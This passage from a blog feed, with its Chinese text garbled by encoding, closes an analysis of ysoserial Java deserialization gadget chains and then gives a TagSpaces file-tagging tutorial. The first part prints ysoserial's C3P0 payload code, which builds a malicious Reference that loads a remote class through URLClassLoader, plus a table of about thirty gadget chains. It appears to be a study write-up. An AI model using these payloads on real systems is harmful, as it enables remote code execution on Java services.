ä¸­ä½¿ç”¨ URLClassLoader ä» URL ä¸­åŠ è½½äº†ç±»å¹¶å®ä¾‹åŒ–</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">referenceToObject</span><span class="params">(Reference var0, Name var1, Context var2, Hashtable var3)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String var4 = var0.getFactoryClassName();</span><br><span class="line">        String var11 = var0.getFactoryClassLocation();</span><br><span class="line">        ClassLoader var6 = Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="keyword">if</span> (var6 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var6 = ReferenceableUtils.class.getClassLoader();</span><br><span class="line">        &#125;</span><br><span class="line">        Object var7;</span><br><span class="line">        <span class="keyword">if</span> (var11 == <span class="keyword">null</span>) &#123;</span><br><span class="line">            var7 = var6;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ URLClassLoader ä» URL ä¸­åŠ è½½äº†ç±»å¹¶å®ä¾‹åŒ–</span></span><br><span class="line">            URL var8 = <span class="keyword">new</span> URL(var11);</span><br><span class="line">            var7 = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;var8&#125;, var6);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        Class var12 = Class.forName(var4, <span class="keyword">true</span>, (ClassLoader)var7);</span><br><span class="line">        ObjectFactory var9 = (ObjectFactory)var12.newInstance();</span><br><span class="line">        <span class="keyword">return</span> var9.getObjectInstance(var0, var1, var2, var3);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">        <span class="keyword">if</span> (logger.isLoggable(MLevel.FINE)) &#123;</span><br><span class="line">            logger.log(MLevel.FINE, <span class="string">&quot;Could not resolve Reference to Object!&quot;</span>, var10);</span><br><span class="line">        &#125;</span><br><span class="line">        NamingException var5 = <span class="keyword">new</span> NamingException(<span class="string">&quot;Could not resolve Reference to Object!&quot;</span>);</span><br><span class="line">        var5.setRootCause(var10);</span><br><span class="line">        <span class="keyword">throw</span> var5;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#PoolSource ä¸å¯åºåˆ—åŒ–çš„å¹¶ä¸”å®ç°äº† Referenceable çš„ ConnectionPoolDataSource å¯¹è±¡ï¼Œå¹¶ä¸”å…¶ getReference æ–¹æ³•è¿”å›æ¶æ„ç±»ä½ç½®ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String className;</span><br><span class="line">    <span class="keyword">private</span> String url;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.className = className;</span><br><span class="line">        <span class="keyword">this</span>.url = url;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">&quot;exploit&quot;</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.C3P0#getObject æ„é€ æ¶æ„ URL ä½œä¸º PoolSource å¯¹è±¡çš„å®ä¾‹åŒ–å‚æ•°ï¼Œè¿›ä¸€æ­¥å°† PoolBackedDataSource å¯¹è±¡çš„ connectionPoolDataSource æŒ‡å‘æ¶æ„çš„ PoolSourceã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// æ„é€  url</span></span><br><span class="line">    <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Command format is: &lt;base_url&gt;:&lt;classname&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">    String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å®ä¾‹åŒ– PoolBackedDataSource</span></span><br><span class="line">    PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">    <span class="comment">// åˆ©ç”¨åå°„èµ‹å€¼</span></span><br><span class="line">    Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">&quot;connectionPoolDataSource&quot;</span>).set(b, <span class="keyword">new</span> PoolSource(className, url));</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><table><thead><tr><th>åç§°</th><th>å…¥å£ç‚¹ï¼ˆkick-offï¼‰</th><th>è°ƒç”¨é“¾ï¼ˆchainï¼‰</th><th>è§¦å‘ç‚¹ï¼ˆsinkï¼‰</th></tr></thead><tbody><tr><td>URLDNS</td><td>HashMap</td><td></td><td>URL</td></tr><tr><td>Commons Collections 1</td><td>AnnotationInvocationHandler</td><td>LazyMap/TransformedMap</td><td>Transformer</td></tr><tr><td>Commons Collections 2</td><td>PriorityQueue</td><td>TransformingComparator</td><td>Transformer/TemplatesImpl</td></tr><tr><td>Commons Collections 3</td><td>AnnotationInvocationHandler</td><td>LazyMap + Transformer + TrAXFilter</td><td>TemplatesImpl</td></tr><tr><td>Commons Collections 4</td><td>PriorityQueue/TreeBag</td><td>TransformingComparator + Transformer + TrAXFilter</td><td>TemplatesImpl</td></tr><tr><td>Commons Collections 5</td><td>BadAttributeValueExpException</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Collections 6</td><td>HashMap/HashSet</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Collections 7</td><td>Hashtable</td><td>TiedMapEntry + LazyMap</td><td>Transformer</td></tr><tr><td>Commons Beanutils</td><td>PriorityQueue</td><td>BeanComparator + CaseInsensitiveComparator</td><td>TemplatesImpl</td></tr><tr><td>Spring1</td><td>AnnotationInvocationHandler</td><td>MethodInvokeTypeProvider + TypeProvider +ObjectFactoryDelegatingInvocationHandler + AnnotationInvocationHandler</td><td>TemplatesImpl</td></tr><tr><td>Spring2</td><td>AnnotationInvocationHandler</td><td>MethodInvokeTypeProvider + TypeProvider + JdkDynamicAopProxy + AnnotationInvocationHandler</td><td>TemplatesImpl</td></tr><tr><td>Hibernate1</td><td>HashMap</td><td>TypedValue + PojoComponentTuplizer + GetterMethodImpl/BasicGetter</td><td>TemplatesImpl</td></tr><tr><td>Hibernate2</td><td>HashMap</td><td>TypedValue + PojoComponentTuplizer + GetterMethodImpl/BasicGetter</td><td>JdbcRowSetImpl</td></tr><tr><td>Groovy1</td><td>AnnotationInvocationHandler</td><td>ConvertedClosure</td><td>MethodClosure</td></tr><tr><td>FileUpload1</td><td>DiskFileItem</td><td></td><td>DeferredFileOutputStream</td></tr><tr><td>Wicket1</td><td>DiskFileItem</td><td></td><td>DeferredFileOutputStream</td></tr><tr><td>MozillaRhino1</td><td>BadAttributeValueExpException</td><td>NativeError + NativeJavaMethod + NativeJavaObject + MemberBox</td><td>TemplatesImpl</td></tr><tr><td>MozillaRhino2</td><td>NativeJavaObject</td><td>JavaAdapter + NativeJavaArray + Environment + JavaMembers</td><td>TemplatesImpl</td></tr><tr><td>Myfaces1</td><td>HashMap</td><td>ValueExpressionMethodExpression</td><td>ValueExpression</td></tr><tr><td>Myfaces2</td><td>HashMap</td><td>ValueExpressionMethodExpression</td><td>ValueExpression</td></tr><tr><td>ROME1</td><td>HashMap</td><td>ObjectBean + EqualsBean + ToStringBean</td><td>TemplatesImpl</td></tr><tr><td>BeanShell1</td><td>PriorityQueue</td><td>XThis$Handler + This</td><td>BshMethod</td></tr><tr><td>C3P0</td><td>PoolBackedDataSourceBase</td><td>ReferenceIndirector + ReferenceableUtils</td><td>URLClassLoader</td></tr><tr><td>Clojure1</td><td>HashMap</td><td>AbstractTableModel$ff19274a + clojure.core$comp$fn__4727 + clojure.core$constantly$fn__4614 + clojure.main$eval_opt + clojure.core$eval</td><td>Compiler</td></tr><tr><td>Click1</td><td>PriorityQueue</td><td>Column$ColumnComparator + PropertyUtils</td><td>TemplatesImpl</td></tr><tr><td>Vaadin1</td><td>BadAttributeValueExpException</td><td>PropertysetItem + NestedMethodProperty</td><td>TemplatesImpl</td></tr><tr><td>AspectJWeaver</td><td>HashSet</td><td>TiedMapEntry + LazyMap</td><td>SimpleCache$StorableCachingMap</td></tr><tr><td>Jython</td><td>PriorityQueue</td><td>Comparator + XThis$Handler + PyFunction</td><td>PyBytecode</td></tr><tr><td>JavassistWeld</td><td>InterceptorMethodHandler</td><td>SimpleInterceptionChain + SimpleMethodInvocation</td><td>TemplatesImpl</td></tr><tr><td>JBossInterceptors</td><td>InterceptorMethodHandler</td><td>SimpleInterceptionChain + SimpleMethodInvocation</td><td>TemplatesImpl</td></tr></tbody></table><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://www.anquanke.com/post/id/201762">JAVAååºåˆ—åŒ–-ysoserial-URLDNS</a></li><li><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">Triggering a DNS lookup using Java Deserialization</a></li><li><a href="https://gist.github.com/frohoff/24af7913611f8406eaf3">Security Advisory â€“ Java SE</a></li><li><a href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Javaååºåˆ— Jdk7u21 Payload å­¦ä¹ ç¬”è®°</a></li><li><a href="https://wooyun.js.org/drops/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B7%A5%E5%85%B7ysoserial%E5%88%86%E6%9E%90.html">javaååºåˆ—åŒ–å·¥å…·ysoserialåˆ†æ</a></li><li><a href="http://www.cnblogs.com/tr1ple/p/12421157.html">javaååºåˆ—åŒ–-ysoserial-è°ƒè¯•åˆ†ææ€»ç»“ç¯‡(6)</a></li><li><a href="https://paper.seebug.org/1242">Javaå®‰å…¨ä¹‹ååºåˆ—åŒ–ç¯‡-URLDNS&amp;Commons Collections 1-7ååºåˆ—åŒ–é“¾åˆ†æ</a></li><li><a href="https://paper.seebug.org/1723">Ysoserial Commons-Collections åˆ©ç”¨é“¾åˆ†æ</a></li><li><a href="https://paper.seebug.org/1224/">Java ååºåˆ—åŒ–ç³»åˆ— ysoserial Jdk7u21</a></li><li><a href="https://paper.seebug.org/1171/">Java ååºåˆ—åŒ–ç³»åˆ— ysoserial Groovy 1</a></li><li><a href="https://medium.com/@m01e/ysoserial-groovy1%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-2d53f197efc4">ysoserial Groovy1æ¨¡å—åˆ†æ</a></li><li><a href="https://www.secpulse.com/archives/166957.html">Ysoserial Click1åˆ©ç”¨é“¾åˆ†æ</a></li><li><a href="https://blog.knownsec.com/2016/03/java-deserialization-commonsbeanutils-pop-chains-analysis/">Java ååºåˆ—åŒ–ä¹‹ CommonsBeanUtils åˆ†æ</a></li><li><a href="https://www.buaq.net/go-21093.html">ysoserial â€“ Clojureåˆ†æ</a></li><li><a href="https://c014.cn/blog/java/ROME/ROME%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.html">ROME ååºåˆ—åŒ–åˆ†æ</a></li><li><a href="https://su18.org/post/ysuserial/">Java ååºåˆ—åŒ–å–ç»è·¯</a></li></ul>]]></content>
    
    
    <summary type="html">Java ååºåˆ—åŒ–æ¼æ´å…¥é—¨ï¼Œæ¢³ç† ysoserial ä¸­çš„ POC</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶æ ‡ç­¾å·¥å…· TagSpaces ä½¿ç”¨</title>
    <link href="https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/"/>
    <id>https://jckling.github.io/2021/09/09/Other/%E6%96%87%E4%BB%B6%E6%A0%87%E7%AD%BE%E5%B7%A5%E5%85%B7%20TagSpaces%20%E4%BD%BF%E7%94%A8/</id>
    <published>2021-09-09T06:10:54.000Z</published>
    <updated>2022-03-08T09:03:12.290Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ä¹‹å‰ç© mod ä¸‹è½½äº†ä¸€å¤§å †æè´¨æ–‡ä»¶å’ŒåŠ¨ä½œæ–‡ä»¶ï¼Œä½†æ˜¯ä¸‹è½½çš„æ–‡ä»¶å¹¶æ²¡æœ‰æŒ‰ç…§ç½‘ç«™ä¸Šçš„ id ç»Ÿä¸€æ–‡ä»¶å¤¹åç§°ï¼Œç»“æœå°±æ˜¯å„ç§å„æ ·çš„æ–‡ä»¶å¤¹åç§°ï¼Œå®Œå…¨çœ‹ä¸å‡ºæ¥å†…å®¹åˆ°åº•æ˜¯ä»€ä¹ˆï¼Œè€Œä¸”ä¹Ÿä¸çŸ¥é“æŸäº›ç§æ—èƒ½ä¸èƒ½ç”¨â€¦</p><p><img src="https://i.loli.net/2021/09/09/HrSD3Rj9g7Ew4Wq.png" style="zoom:80%;" /> <br /></p><p>åæ¥æ˜¯æ‰“ç®—ç›´æ¥çˆ¬ <a href="https://www.xivmodarchive.com/">ffxivmodarchive</a> ç½‘ç«™ä¸Šçš„ mod ä¿¡æ¯ï¼Œç„¶ååœ¨æœ¬åœ°æµè§ˆï¼Œæä¾›é¢„è§ˆã€æ˜¯å¦å·²ä¸‹è½½å’Œå…¶ä»–å„ç§æ ‡ç­¾ï¼ˆç§æ—ã€æ€§åˆ«ç­‰ï¼‰ã€‚ä½†æ˜¯åšä¸€åŠå‘ç°æœ‰ç‚¹åšä¸åŠ¨ï¼ˆ<a href="https://github.com/jckling/ffxiv-modarchive">jckling/ffxiv-modarchive</a>ï¼‰ï¼šâ‘  éœ€è¦æ¯å¤©åŒæ­¥ç½‘ç«™ä¸Šçš„æ•°æ®ï¼›â‘¡ ä¸‹è½½åœ°å€å¯èƒ½å¤–é“¾åˆ°è°·æ­Œäº‘ç«¯ç¡¬ç›˜ï¼Œéœ€è¦æ‰‹åŠ¨å°†ä¿å­˜çš„æ–‡ä»¶å¤¹åç§°æ”¹ä¸º idï¼›â‘¢ å‰ç«¯å±•ç¤ºé¡µé¢ä¸å¥½å†™ã€‚</p><p>å››èˆäº”å…¥ä¸Šé¢çš„åŠŸèƒ½å°±æ˜¯â€œåå‘ä»£ç†â€åŠ ä¸€ä¸ªæ˜¯å¦å·²ä¸‹è½½çš„è®°å½•è€Œå·²ï¼Œåšèµ·æ¥å¥½éº»çƒ¦äºæ˜¯æç½®äº†ï¼ˆæ‘Šæ‰‹</p><p>æ˜¨å¤©èŠ±äº†ç‚¹æ—¶é—´æ‰¾æ‰“æ ‡ç­¾çš„å·¥å…·ï¼Œæœ‰ä¸€ä¸ª <a href="https://github.com/files-community/Files">Files</a> æ–‡ä»¶æµè§ˆå·¥å…·æ”¯æŒæ‰“æ ‡ç­¾ï¼Œä½†æ˜¯ä»å¾®è½¯åº”ç”¨å•†åº—é‡Œä¸‹è½½çš„æ˜¯ 1.x ç‰ˆæœ¬ï¼Œæš‚ä¸æ”¯æŒæ ‡ç­¾åŠŸèƒ½ ğŸ˜…ã€‚å…¶ä»–çš„æœ‰ <a href="https://www.tagflow.ch/en/">TagFlow</a>ã€<a href="https://alltags.net/">allTags</a>ã€<a href="https://www.tagspaces.org/">TagSpaces</a>ã€<a href="https://www.taglyst.com/">tagLyst</a>ï¼Œç›´æ¥æ ¹æ® UI çš„å–œå¥½é€‰äº† TagSpaces ç”¨ï¼ŒåŠŸèƒ½ä¹Ÿæ˜¯å¤Ÿçš„ã€‚</p><h1 id="TagSpaces"><a href="#TagSpaces" class="headerlink" title="TagSpaces"></a>TagSpaces</h1><p>è·¨å¹³å°æ‰“æ ‡ç­¾å·¥å…·ï¼Œæ”¯æŒå¯¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹æ‰“æ ‡ç­¾ã€åŠ æ³¨è§£ï¼›æ”¯æŒæ–‡æœ¬æœç´¢å’Œæ ‡ç­¾æœç´¢ï¼ˆå¸ƒå°”è¿ç®—ï¼‰ï¼›é›†æˆé¢„è§ˆå’Œç¼–è¾‘åŠŸèƒ½ã€‚</p><p>ä¸‹è½½åœ°å€ï¼š</p><ul><li>å®˜ç½‘ï¼š<a href="https://www.tagspaces.org/downloads/">https://www.tagspaces.org/downloads/</a></li><li>Githubï¼š<a href="https://github.com/tagspaces/tagspaces/releases">https://github.com/tagspaces/tagspaces/releases</a></li></ul><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><p>ä»å®˜ç½‘ä¸‹è½½ 64 ä½çš„ installer</p><p><img src="https://i.loli.net/2021/09/09/WTKhz4ZfGlLgU8D.jpg" style="zoom:80%;" /><br /></p><p>é€‰æ‹©ä¸ºä»»ä½•äººå®‰è£…ï¼ˆæˆ‘è¿™é‡Œå·²ç»å®‰è£…è¿‡äº†ï¼‰</p><p><img src="https://i.loli.net/2021/09/09/nSW6aodrHus9X7Q.jpg" style="zoom: 75%;" /><br /></p><p>åŒæ„è®¸å¯è¯åè®®åï¼Œç„¶åï¼Œæ‰§è¡Œå®‰è£…</p><p><img src="https://i.loli.net/2021/09/09/32OvhnMu8Ycx49g.jpg" style="zoom:75%;" /><br /></p><p>ç¬¬ä¸€æ¬¡æ‰“å¼€éœ€è¦é€‰æ‹©æ ‡ç­¾çš„ä¿å­˜æ–¹å¼ï¼Œä¹Ÿå¯ä»¥åœ¨è®¾ç½®é‡Œä¿®æ”¹</p><ul><li>é‡å‘½åæ–‡ä»¶ï¼ˆRENAME FILEï¼‰</li><li>é¢å¤–æ–‡ä»¶ï¼ˆUSE SIDECAR FILEï¼‰</li></ul><p>å¦å¤–ï¼Œå¯ä»¥åœ¨è®¾ç½®é‡Œé€‰æ‹©ä¸­æ–‡</p><img src="https://i.loli.net/2021/09/09/e5JglQmKXhdaMzj.jpg" style="zoom:60%;" /><h2 id="ç•Œé¢"><a href="#ç•Œé¢" class="headerlink" title="ç•Œé¢"></a>ç•Œé¢</h2><p>è¿™äº›ç•Œé¢åœ¨æµè§ˆæ–‡ä»¶æ—¶ä¸ä¸€å®šéƒ½æœ‰ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®æ›´æ”¹æ˜¯å¦æ˜¾ç¤ºï¼Œæ¯ä¸ªåŒºåŸŸå…·ä½“çš„åŠŸèƒ½å°±ä¸å±•å¼€äº†ï¼Œçœ‹å®˜æ–¹æ–‡æ¡£å°±å¥½ã€‚</p><ol><li>å‚ç›´å·¥å…·æ ï¼šå§‹ç»ˆå¯è§ï¼Œæä¾›å¯¹åº”ç”¨ç¨‹åºä¸»è¦éƒ¨åˆ†çš„å¿«é€Ÿè®¿é—®</li><li>ä½ç½®ç®¡ç†å™¨/æ ‡ç­¾åº“/æœç´¢åŒºåŸŸï¼šç®¡ç†å…³è”çš„ä½ç½®ï¼Œæ ‡è®°åº“ï¼Œæœç´¢æ–‡ä»¶å’Œæ–‡ä»¶å¤¹</li><li>å¯¼èˆªï¼šåˆ‡æ¢ä½ç½®æˆ–å¿«é€Ÿå¯¼èˆªåˆ°çˆ¶æ–‡ä»¶å¤¹</li><li>æµè§ˆåŒºåŸŸï¼šæµè§ˆæ–‡ä»¶å’Œæ–‡ä»¶å¤¹</li><li>å¸¸ç”¨æ“ä½œåŒºï¼šåœ¨è¿™é‡Œå¯ä»¥è®¿é—®å½“å‰æ‰“å¼€çš„æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å¸¸ç”¨æ“ä½œ</li><li>æ–‡ä»¶/æ–‡ä»¶å¤¹å±æ€§ï¼šå±•ç¤ºæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„ä¸€äº›å±æ€§</li><li>é¢„è§ˆåŒºï¼šé¢„è§ˆæˆ–ç¼–è¾‘å½“å‰æ–‡ä»¶</li></ol><img src="https://docs.tagspaces.org/assets/images/main-ui-areas-7170f35243bccbbfc608936cb13577ab.png" /><h2 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾"></a>æ ‡ç­¾</h2><p>é‡ç‚¹å°±æ˜¯ç»™æ–‡ä»¶å¤¹<strong>æ‰“æ ‡ç­¾</strong>ï¼Œé¦–å…ˆæˆ‘åˆ é™¤äº†é»˜è®¤å…³è”çš„æ–‡ä»¶å¤¹ï¼ˆLOCATION MANAGERï¼‰ï¼Œç„¶åå…³è”ä¿å­˜å§¿åŠ¿æ–‡ä»¶ï¼ˆCMToolï¼‰å’Œ Mod æ–‡ä»¶ï¼ˆTexToolsï¼‰çš„è·¯å¾„ã€‚</p><p>å…·ä½“çš„æ“ä½œæ˜¯ï¼š<code>CONNECT A LOCATION -&gt; å¡«å…¥ Location Path -&gt; è®¾ç½® Location Name -&gt; OK</code></p><p><img src="https://i.loli.net/2021/09/09/xIae7kfpDPzMN6J.jpg" style="zoom:70%;" /><br /></p><p>å…³è”ä¹‹åå°±å¯ä»¥è¿›è¡ŒæŸ¥çœ‹ï¼ˆæˆ‘è¿™é‡Œå·²ç»æ‰“äº†å‡ ä¸ªæ ‡ç­¾ï¼‰</p><p><img src="https://i.loli.net/2021/09/09/Rxa47IV2KDghcSr.jpg" style="zoom:70%;" /><br /></p><p>ç‚¹å‡»å·¦ä¾§çš„æ ‡ç­¾å¯ä»¥åˆ›å»ºæ ‡ç­¾ç»„ï¼Œæˆ‘å·²ç»æŠŠé»˜è®¤çš„æ ‡ç­¾ç»„éƒ½ç»™åˆ äº†ï¼ŒCollected Tags æ”¶é›†ç›´æ¥å¯¹æ–‡ä»¶/æ–‡ä»¶å¤¹æ·»åŠ ä¸åœ¨æ ‡ç­¾ç»„ä¸­çš„æ ‡ç­¾ã€‚</p><p><img src="https://i.loli.net/2021/09/09/HmOA7pC9KcfS3PT.jpg" style="zoom:70%;" /><br /></p><p>ç‚¹å‡» TAG LIBRARY æ—è¾¹çš„ä¸‰ä¸ªç‚¹ï¼Œé€‰æ‹©åˆ›å»ºæ ‡ç­¾ç»„ï¼ˆCreate Tag Groupï¼‰ï¼Œè®¾ç½®æ ‡ç­¾ç»„åç§°å’Œé»˜è®¤çš„èƒŒæ™¯/æ–‡å­—é¢œè‰²ï¼Œåˆ›å»ºå®Œæ¯•åæ‹¬å·å†…æ˜¾ç¤ºåˆ›å»ºæ ‡ç­¾æ—¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹åç§°ï¼Œä¸è¿‡å…¶ä»–æ–‡ä»¶å¤¹ä¹Ÿå¯ä»¥ç”¨å°±æ˜¯äº†ã€‚</p><p><img src="https://i.loli.net/2021/09/09/h2vuLrXIYQNVMjZ.png" style="zoom:60%;" /><br /></p><p>ç‚¹å‡»æ ‡ç­¾ç»„æ—è¾¹çš„ä¸‰ä¸ªç‚¹ï¼Œé€‰æ‹©æ·»åŠ æ ‡ç­¾ï¼ˆAdd Tagsï¼‰ï¼Œæ·»åŠ å®Œæ¯•åç‚¹å‡»æ ‡ç­¾æ—è¾¹çš„ä¸‰ä¸ªç‚¹å¯ä»¥è®¾ç½®æ ‡ç­¾åç§°ã€èƒŒæ™¯/æ–‡å­—é¢œè‰²ã€‚</p><p><img src="https://i.loli.net/2021/09/09/qr9kKMJY45F6RPp.png" style="zoom:60%;" /><br /></p><p>è®¾ç½®å®Œæ ‡ç­¾ä¹‹åå°±å¯ä»¥å¯¹æ–‡ä»¶å¤¹æ‰“æ ‡ç­¾äº†ï¼Œé€‰æ‹©æ–‡ä»¶å¤¹åï¼Œç‚¹å‡»ä¸Šæ–¹çš„æ ‡ç­¾å›¾æ ‡å³å¯æ·»åŠ æ ‡ç­¾ï¼Œä¸€æ¬¡å¯æ·»åŠ å¤šä¸ªæ ‡ç­¾ã€‚</p><img src="https://i.loli.net/2021/09/09/bvaD9USQEJsnmA7.jpg" style="zoom:75%;" /><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æˆ‘æŠŠä¸Šé¢çš„å†™å®Œæ‰çœ‹åˆ°è®¾ç½®é‡Œå¯ä»¥æ”¹æˆä¸­æ–‡ï¼Œç„¶ååœ¨å®‰è£…é‚£ä¸€èŠ‚è¡¥å……äº†è®¾ç½®æ–¹æ³• ğŸ†˜</p><p>æ€»ä½“æ¥è¯´ç”¨èµ·æ¥å¾ˆæ–¹ä¾¿ï¼Œä¸ºäº†é¿å…é‡å‘½åæ–‡ä»¶ï¼Œæˆ‘é€‰æ‹©äº†ä½¿ç”¨é™„åŠ æ–‡ä»¶çš„æ–¹å¼ï¼Œè¿™æ ·åšçš„ç»“æœå°±æ˜¯æ–‡ä»¶å¤¹ä¸­ä¼šå‡ºç°ä¸€ä¸ª <code>.ts</code> æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­çš„ json æ–‡ä»¶ä¿å­˜äº†æ ‡ç­¾ä¿¡æ¯ã€‚<code>.ts</code> æ–‡ä»¶å¤¹é»˜è®¤æ˜¯éšè—çš„ï¼Œå¯¹æˆ‘æ¥è¯´ï¼Œå­˜çš„æ–‡ä»¶å¤¹å’Œæ ‡ç­¾ä¹Ÿå 